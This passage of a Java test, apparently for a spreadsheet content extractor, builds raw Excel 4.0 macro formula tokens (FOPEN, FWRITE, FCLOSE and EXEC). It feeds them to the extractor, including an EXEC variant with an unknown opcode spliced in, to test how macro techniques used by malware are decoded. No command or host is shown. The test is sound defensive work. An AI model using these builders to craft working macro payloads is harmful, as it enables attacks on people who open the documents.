                                "/xl/macrosheets/" + names[i] + ".xml"),
                        XSSFRelation.MACRO_SHEET_XML.getContentType());
                try (OutputStream stream = part.getOutputStream()) {
                    stream.write(xml[i].getBytes(StandardCharsets.UTF_8));
                }
            }
            XSSFExcelExtractorDecorator decorator =
                    new XSSFExcelExtractorDecorator(parseContext, opcPackage, Locale.ROOT);
            decorator.metadata = metadata;
            Method process = XSSFExcelExtractorDecorator.class.getDeclaredMethod(
                    "processXlmXmlMacroSheets", OPCPackage.class,
                    XHTMLContentHandler.class, XSSFSharedStringsShim.class);
            process.setAccessible(true);

            xhtml.startDocument();
            process.invoke(decorator, opcPackage, xhtml, null);
            xhtml.endDocument();
        }
        return output.toString();
    }

    private static byte[] fopenFormula(String path) {
        byte[] pathBytes = path.getBytes(StandardCharsets.UTF_16LE);
        return ByteBuffer.allocate(1 + 2 + pathBytes.length + 3 + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x17)
                .putShort((short) path.length())
                .put(pathBytes)
                .put((byte) 0x1e)
                .putShort((short) 3)
                .put((byte) 0x22)
                .put((byte) 2)
                .putShort((short) 0x0084)
                .array();
    }
    private static byte[] fcloseFormula(int handle) {
        return ByteBuffer.allocate(3 + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x1e)
                .putShort((short) handle)
                .put((byte) 0x22)
                .put((byte) 1)
                .putShort((short) 0x0085)
                .array();
    }
    private static byte[] fwriteFormula(int handle, String text) {
        byte[] textBytes = text.getBytes(StandardCharsets.UTF_16LE);
        return ByteBuffer.allocate(3 + 1 + 2 + textBytes.length + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x1e)
                .putShort((short) handle)
                .put((byte) 0x17)
                .putShort((short) text.length())
                .put(textBytes)
                .put((byte) 0x22)
                .put((byte) 2)
                .putShort((short) 0x008a)
                .array();
    }

    /** PtgStr(command) + PtgFuncVar(argc=1, EXEC). Mirrors XlmCaptureBoundsTest. */
    private static byte[] execFormula(String command) {
        byte[] commandBytes = command.getBytes(StandardCharsets.UTF_16LE);
        return ByteBuffer.allocate(1 + 2 + commandBytes.length + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x17)
                .putShort((short) command.length())
                .put(commandBytes)
                .put((byte) 0x22)
                .put((byte) 1)
                .putShort((short) 0x006e)
                .array();
    }

    /**
     * Same, with one UNKNOWN opcode byte spliced in front of the PtgFuncVar. 0x30 is not in
     * the decoder's handled set, and being unknown its operand length is unknown, so the
     * cursor cannot be advanced past it.
     */
    private static byte[] execFormulaWithUnknownPtgSpliced(String command) {
        byte[] commandBytes = command.getBytes(StandardCharsets.UTF_16LE);
        return ByteBuffer.allocate(1 + 2 + commandBytes.length + 1 + 4)
                .order(ByteOrder.LITTLE_ENDIAN)
                .put((byte) 0x17)
                .putShort((short) command.length())
                .put(commandBytes)
                .put((byte) 0x30)
                .put((byte) 0x22)
                .put((byte) 1)
                .putShort((short) 0x006e)
                .array();
    }
}
